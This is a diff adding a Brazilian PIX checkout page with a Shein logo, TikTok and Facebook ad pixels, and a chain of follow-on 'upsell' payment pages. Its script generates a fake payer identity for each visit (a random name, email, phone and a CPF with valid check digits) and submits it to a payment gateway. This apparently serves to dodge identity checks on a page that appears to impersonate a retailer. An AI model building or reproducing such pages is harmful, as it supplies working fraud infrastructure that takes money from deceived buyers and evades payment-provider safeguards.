@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <!-- TikTok Pixel Code Start -->
+  <script>
+    !(function (w, d, t) {
+      w.TiktokAnalyticsObject = t;
+      var ttq = (w[t] = w[t] || []);
+      (ttq.methods = [
+        "page",
+        "track",
+        "identify",
+        "instances",
+        "debug",
+        "on",
+        "off",
+        "once",
+        "ready",
+        "alias",
+        "group",
+        "enableCookie",
+        "disableCookie",
+        "holdConsent",
+        "revokeConsent",
+        "grantConsent",
+      ]),
+        (ttq.setAndDefer = function (t, e) {
+          t[e] = function () {
+            t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+          };
+        });
+      for (var i = 0; i < ttq.methods.length; i++)
+        ttq.setAndDefer(ttq, ttq.methods[i]);
+      (ttq.instance = function (t) {
+        for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)
+          ttq.setAndDefer(e, ttq.methods[n]);
+        return e;
+      }),
+        (ttq.load = function (e, n) {
+          var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+            o = n && n.partner;
+          (ttq._i = ttq._i || {}),
+            (ttq._i[e] = []),
+            (ttq._i[e]._u = r),
+            (ttq._t = ttq._t || {}),
+            (ttq._t[e] = +new Date()),
+            (ttq._o = ttq._o || {}),
+            (ttq._o[e] = n || {});
+          n = document.createElement("script");
+          (n.type = "text/javascript"),
+            (n.async = !0),
+            (n.src = r + "?sdkid=" + e + "&lib=" + t);
+          e = document.getElementsByTagName("script")[0];
+          e.parentNode.insertBefore(n, e);
+        });
+      ttq.load("D4L24BRC77UEBGID2NJ0");
+      ttq.ready(function () {
+        ttq.enableCookie();
+        ttq.page();
+      });
+    })(window, document, "ttq");
+  </script>
+  <!-- TikTok Pixel Code End -->
+
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pagamento via PIX</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
+  <link href="/checkout/css/all.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+  <!-- Alterando biblioteca QR code para qrcodejs -->
+  <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
+  <link rel="stylesheet" href="/checkout/css/css.css" />
+
+  <style>
+    .payment-status {
+      margin-top: 20px;
+      padding: 15px;
+      background: #f8f9fa;
+      border-radius: 8px;
+      border-left: 4px solid #007bff;
+    }
+
+    .status-content {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+
+    .status-icon {
+      font-size: 24px;
+      color: #007bff;
+    }
+
+    .status-text {
+      flex: 1;
+    }
+
+    .status-title {
+      margin: 0;
+      font-weight: 600;
+      color: #333;
+      font-size: 16px;
+    }
+
+    .status-subtitle {
+      margin: 5px 0 0 0;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .payment-status .fa-check-circle {
+      color: #28a745;
+    }
+  </style>
+
+  <script src="/checkout/js/utm-handler.js" data-token="3ca56e4c-ec1c-45c3-b585-b516367ae3a9"
+    data-click-id-param="click_id"></script>
+</head>
+
+<body>
+  <header>
+    <div class="container" style="padding:0">
+      <img src="/checkout/images/shein-logo.png" alt="Logo Pagamento PIX" class="logo" />
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="payment-container">
+      <div class="security-badge">
+        <i class="fas fa-lock"></i>
+        <span>Ambiente Seguro</span>
+      </div>
+
+      <div id="loading" class="loading">
+        <div class="spinner"></div>
+        <p>Gerando QRCode para pagamento...</p>
+      </div>
+
+      <div id="payment-content" style="display: none">
+        <div class="qrcode-container">
+          <h2 class="section-title">
+            <i class="fas fa-mobile-alt"></i>
+            Escaneie o QRCode abaixo
+          </h2>
+          <div id="qrcode"></div>
+          <img id="qrcode-img" style="display: none" alt="QR Code PIX" />
+        </div>
+
+        <div class="copy-section">
+          <h2 class="section-title">
+            <i class="far fa-copy"></i>
+            Ou copie o código PIX
+          </h2>
+          <div class="input-group">
+            <input type="text" id="pix-code" readonly="" />
+            <button class="copy-btn" id="copy-btn">
+              <i class="far fa-copy"></i>
+              <span>Copiar</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="payment-info">
+          <div class="info-item">
+            <span class="info-label">
+              <i class="fas fa-money-bill-wave"></i>
+              Valor:
+            </span>
+            <span id="amount"><!-- Valor será inserido via JS --></span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">
+              <i class="far fa-clock"></i>
+              Válido até:
+            </span>
+            <span id="expiration">--/--/---- --:--</span>
+          </div>
+        </div>
+
+        <div class="trust-badges">
+          <div class="trust-badge">
+            <i class="fas fa-shield-alt text-success"></i>
+            <span>Pagamento Seguro</span>
+          </div>
+          <div class="trust-badge">
+            <i class="fas fa-bolt"></i>
+            <span>Transação Instantânea</span>
+          </div>
+          <div class="trust-badge">
+            <i class="fas fa-headset"></i>
+            <span>Suporte 24/7</span>
+          </div>
+        </div>
+
+        <!-- Indicador de verificação de pagamento -->
+        <div id="payment-status" class="payment-status" style="display: none">
+          <div class="status-content">
+            <div class="status-icon">
+              <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <div class="status-text">
+              <p class="status-title">
+                Aguardando confirmação do pagamento...
+              </p>
+              <p class="status-subtitle" id="status-subtitle">
+                Verificando a cada 5 segundos
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="error-message" class="error-message" style="display: none"></div>
+    </div>
+  </div>
+
+  <script>
+    // --- LÓGICA DE GERAÇÃO DE DADOS (PORTADO DO PHP) ---
+
+    function gerarDígitoCPF(cpfParcial) {
+      let soma = 0;
+      let resto;
+      for (let i = 1; i <= cpfParcial.length; i++) {
+        soma = soma + parseInt(cpfParcial.substring(i - 1, i)) * (cpfParcial.length + 2 - i);
+      }
+      resto = (soma * 10) % 11;
+      if ((resto == 10) || (resto == 11)) resto = 0;
+      return resto;
+    }
+
+    function gerarCPF() {
+      let n1 = Math.floor(Math.random() * 10);
+      let n2 = Math.floor(Math.random() * 10);
+      let n3 = Math.floor(Math.random() * 10);
+      let n4 = Math.floor(Math.random() * 10);
+      let n5 = Math.floor(Math.random() * 10);
+      let n6 = Math.floor(Math.random() * 10);
+      let n7 = Math.floor(Math.random() * 10);
+      let n8 = Math.floor(Math.random() * 10);
+      let n9 = Math.floor(Math.random() * 10);
+
+      // 9 primeiros dígitos
+      let cpf = `${n1}${n2}${n3}${n4}${n5}${n6}${n7}${n8}${n9}`;
+
+      let d1 = gerarDígitoCPF(cpf);
+      let d2 = gerarDígitoCPF(cpf + d1);
+
+      return `${cpf}${d1}${d2}`;
+    }
+
+    function gerarNomeAleatorio() {
+      const primeirosNomes = [
+        "Ana", "João", "Maria", "Carlos", "Lucas", "Sofia", "Pedro", "Fernanda", "Eduardo",
+        "Isabela", "Gustavo", "Beatriz", "Ricardo", "Patrícia", "Roberto", "Juliana",
+        "Felipe", "Larissa", "Thiago", "Julio", "Cláudia", "Vitor", "Bruna", "Renato", "Vanessa"
+      ];
+      const sobrenomes = [
+        "Silva", "Santos", "Oliveira", "Costa", "Pereira", "Almeida", "Martins", "Rodrigues",
+        "Melo", "Dias", "Souza", "Nascimento", "Barbosa", "Araujo", "Cavalcanti", "Campos",
+        "Pinto", "Lima", "Carvalho", "Gomes", "Ferreira", "Ribeiro", "Castro", "Mendes",
+        "Azevedo", "Fernandes", "Morais", "Vieira", "Faria", "Pimentel"
+      ];
+
+      const primeiroNome = primeirosNomes[Math.floor(Math.random() * primeirosNomes.length)];
+      const sobrenome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      let terceiroNome;
+      do {
+        terceiroNome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
+      } while (terceiroNome === sobrenome);
+
+      return `${primeiroNome} ${sobrenome} ${terceiroNome}`;
+    }
+
+    function gerarEmail(nomeCompleto) {
+      const nomeFormatado = nomeCompleto
+        .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remove acentos
+        .replace(/\s+/g, "") // Remove espaços
+        .toLowerCase();
+
+      const dia = String(Math.floor(Math.random() * 31) + 1).padStart(2, '0');
+      const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+      const dataNascimento = dia + mes;
+
+      const domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@icloud.com"];
+      const dominio = domains[Math.floor(Math.random() * domains.length)];
+
+      return `${nomeFormatado}${dataNascimento}${dominio}`;
+    }
+
+    function gerarTelefone() {
+      const ddd = Math.floor(Math.random() * (99 - 11 + 1)) + 11;
+      const comDigito9 = Math.random() < 0.5;
+      const numeroBase = Math.floor(Math.random() * 90000000) + 10000000;
+
+      if (comDigito9) {
+        return `${ddd}9${numeroBase}`;
+      } else {
+        return `${ddd}${numeroBase}`;
+      }
+    }
+
+    // --- LÓGICA DE CONFIGURAÇÃO (PORTADO DE nlo-config.php) ---
+
+    function getConfiguracao() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let up = urlParams.get('up');
+
+      let upsellUrl = "../up1";
+      let valor = "36.72";
+      let front = true;
+
+      if (up) {
+        const upInt = parseInt(up);
+        switch (upInt) {
+          case 1:
+            upsellUrl = "../up2";
+            valor = "20.64";
+            front = false;
+            break;
+          case 2:
+            upsellUrl = "../up3";
+            valor = "27.90";
+            front = false;
+            break;
+          case 3:
+            upsellUrl = "../up4";
+            valor = "21.56";
+            front = false;
+            break;
+          case 4:
+            upsellUrl = "../up5";
+            valor = "22.30";
+            front = false;
+            break;
+          case 5:
+            upsellUrl = "../up6";
+            valor = "43.94";
+            front = false;
+            break;
+          case 6:
+            upsellUrl = "../up2";
+            valor = "17.50";
+            front = false;
+            break;
+          default:
+            front = true;
+            break;
+        }
+      }
+
+      return {
+        upsellUrl: upsellUrl,
+        valor: parseFloat(valor),
+        oferta: "tiktok", // valor fixo usado no PHP
+        up: up
+      };
+    }
+
+    // --- VARIÁVEIS GLOBAIS ---
+
+    const config = getConfiguracao();
+    const nomeCompleto = gerarNomeAleatorio();
+    const emailGerado = gerarEmail(nomeCompleto);
+    const cpfGerado = gerarCPF();
+    const telefoneGerado = gerarTelefone();
+
+    // Atualiza o valor na interface
+    const valorFormatado = config.valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+    document.getElementById('amount').textContent = valorFormatado;
+
+    let id_transacao = "";
+
+    // --- LÓGICA DE GERAÇÃO E VERIFICAÇÃO DE PIX ---
+
+    function gerarPix() {
+      const params = new URLSearchParams(window.location.search);
+
+      params.delete("valor");
+      params.delete("up");
+
+      const utmString = params.toString() || "utm_source=direct";
+
+      const formData = {
+        acao: "criar",
+        oferta: config.oferta,
+        valor: config.valor,
+        nome: nomeCompleto,
+        email: emailGerado,
+        cpf: cpfGerado,
+        telefone: telefoneGerado,
+        utm: encodeURIComponent(utmString),
+        up: config.up || ""
+      };
+
+      // Alterado para apontar para a nova Serverless Function em /api/gateway
+      // Como estamos em /checkout/index.html, o caminho é ../api/gateway
+      // Mas a Vercel aceita /api/gateway da raiz
+      const url = new URL("/api/gateway", window.location.origin);
+      Object.keys(formData).forEach(key => {
+        url.searchParams.set(key, formData[key]);
+      });
+
+      console.log("🌐 Chamando API:", url.toString());
+
+      fetch(url)
+        .then((response) => {
+          if (!response.ok) {
+            return response.text().then((text) => {
+              throw new Error(`HTTP ${response.status}: ${text}`);
+            });
+          }
+          return response.json();
+        })
+        .then((data) => {
+          console.log("✅ Resposta da API:", data);
+
+          if (data.erro) {
+            showError(data.erroMsg || "Erro ao gerar o PIX. Tente novamente...");
+          } else if (data.pixCode && data.payment_id) {
+            handlePixSuccess(data);
+          } else {
+            showError("Erro ao gerar o PIX. Resposta inválida.");
+          }
+        })
+        .catch((error) => {
+          console.error("❌ Erro ao chamar API:", error);
+          showError("Erro ao gerar o PIX. Tente novamente...");
+        });
+    }
+
+    function handlePixSuccess(data) {
+      console.log("📝 Dados do PIX recebidos:", data);
+
+      id_transacao = data.payment_id;
+      const pixCode = data.pixCode;
+
+      console.log("✅ TransactionID:", id_transacao);
+      console.log("✅ PIX Code gerado");
+
+      // FB Pixel tracking
+      // Nota: track_fb_pixel era variável PHP. Como não temos configs do servidor aqui,
+      // assumimos que se o tracking script estiver na página (inserido manualmente ou via GTM),
+      // o objeto fbq existirá. Se for crucial passar o ID do pixel dinamicamente, precisaremos de outra estratégia.
+      // Por enquanto, verificamos a existência do fbq.
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'InitiateCheckout', {
+          value: Number(config.valor.toFixed(2)),
+          currency: 'BRL',
+          num_items: 1
+        });
+        console.log('✅ Evento de InitiateCheckout enviado para o Facebook Pixel');
+      }
+
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("payment-content").style.display = "block";
+
+      // Formata data de expiração (2 dias)
+      const expirationDate = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
+      const formattedDate = expirationDate.toLocaleString("pt-BR", {
+        day: "2-digit",
+        month: "2-digit",
+        year: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+      });
+      document.getElementById("expiration").textContent = formattedDate;
+
+      // Preenche o código PIX
+      document.getElementById("pix-code").value = pixCode;
+
+      if (pixCode) {
+        const qrcodeElement = document.getElementById("qrcode");
+        qrcodeElement.innerHTML = "";
+        new QRCode(qrcodeElement, {
+          text: pixCode,
+          width: 240,
+          height: 240,
+          correctLevel: QRCode.CorrectLevel.L
+        });
+      }
+
+      // Configura botão de copiar
+      const copyBtn = document.getElementById("copy-btn");
+      const newCopyBtn = copyBtn.cloneNode(true);
+      copyBtn.parentNode.replaceChild(newCopyBtn, copyBtn);
+      newCopyBtn.addEventListener("click", function () {
+        const pixCodeInput = document.getElementById("pix-code");
+        pixCodeInput.select();
+        pixCodeInput.setSelectionRange(0, 99999);
+
+        // Tenta usar a API moderna de clipboard
+        if (navigator.clipboard && window.isSecureContext) {
+          navigator.clipboard.writeText(pixCodeInput.value).then(() => {
+            newCopyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+            newCopyBtn.classList.add("copied");
+            setTimeout(function () {
+              newCopyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>';
+              newCopyBtn.classList.remove("copied");
+            }, 2000);
+          });
+        } else {
+          // Fallback para navegadores mais antigos
+          document.execCommand("copy");
+          newCopyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+          newCopyBtn.classList.add("copied");
+          setTimeout(function () {
+            newCopyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>';
+            newCopyBtn.classList.remove("copied");
+          }, 2000);
+        }
+      });
+
+      // Inicia verificação de pagamento
+      if (id_transacao) {
+        iniciarVerificacaoPagamento(id_transacao);
+      }
+    }
+
+    let checkPaymentInterval;
+
+    function iniciarVerificacaoPagamento(payment_id) {
+      console.log("🔍 Iniciando verificação de pagamento:", payment_id);
+
+      const statusElement = document.getElementById("payment-status");
+      if (statusElement) {
+        statusElement.style.display = "block";
+      }
+
+      // Função para verificar status do pagamento
+      function checkPaymentStatus() {
+        const url = new URL("/api/gateway", window.location.origin);
+        url.searchParams.set("acao", "verificar");
+        url.searchParams.set("payment_id", payment_id);
+
+        return fetch(url)
+          .then((response) => {
+            if (!response.ok) {
+              return response.text().then((text) => {
+                throw new Error(`HTTP ${response.status}: ${text}`);
+              });
+            }
+            return response.json();
+          })
+          .then((data) => {
+            console.log("🔍 Status do pagamento:", data);
+            const status = data?.status?.toLowerCase();
+
+            if (status === "approved" || status === "completed") {
+              return true;
+            }
+            return false;
+          })
+          .catch((error) => {
+            console.error("❌ Erro na verificação:", error);
+            return false;
+          });
+      }
+
+      // Primeira verificação imediata
+      checkPaymentStatus().then((paid) => {
+        if (paid) {
+          handlePaymentConfirmed(payment_id);
+          return;
+        }
+
+        // Continua verificando a cada 5 segundos
+        checkPaymentInterval = setInterval(() => {
+          checkPaymentStatus().then((paid) => {
+            if (paid) {
+              clearInterval(checkPaymentInterval);
+              handlePaymentConfirmed(payment_id);
+            }
+          });
+        }, 5000);
+      });
+    }
+
+    function handlePaymentConfirmed(payment_id) {
+      console.log("🎉 Pagamento confirmado! Transaction:", payment_id);
+
+      if (checkPaymentInterval) {
+        clearInterval(checkPaymentInterval);
+      }
+
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'Purchase', {
+          currency: 'BRL',
+          value: Number(config.valor.toFixed(2)),
+          transaction_id: payment_id
+        });
+        console.log('✅ Evento de compra enviado para o Facebook Pixel');
+      }
+
+      const statusElement = document.getElementById("payment-status");
+      if (statusElement) {
+        statusElement.innerHTML = `
+          <div class="status-content">
+            <div class="status-icon" style="color: #28a745;">
+              <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="status-text">
+              <p class="status-title" style="color: #28a745;">Pagamento confirmado!</p>
+              <p class="status-subtitle">Redirecionando...</p>
+            </div>
+          </div>
+        `;
+      }
+
+      // Redireciona para o upsell preservando parâmetros UTM
+      const upsell = new URL(config.upsellUrl, window.location.href);
+      const currentParams = new URLSearchParams(window.location.search);
+
+      for (const [key, value] of currentParams.entries()) {
+        if (!upsell.searchParams.has(key)) {
+          upsell.searchParams.set(key, value);
+        }
+      }
+
+      upsell.searchParams.delete("up");
+
+      setTimeout(() => {
+        window.location.href = upsell.toString();
+      }, 2500);
+    }
+
+    function showError(message) {
+      document.getElementById("loading").style.display = "none";
+      const errorElement = document.getElementById("error-message");
+      errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+      errorElement.style.display = "block";
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      gerarPix();
+    });
+  </script>
+</body>
+
+</html>
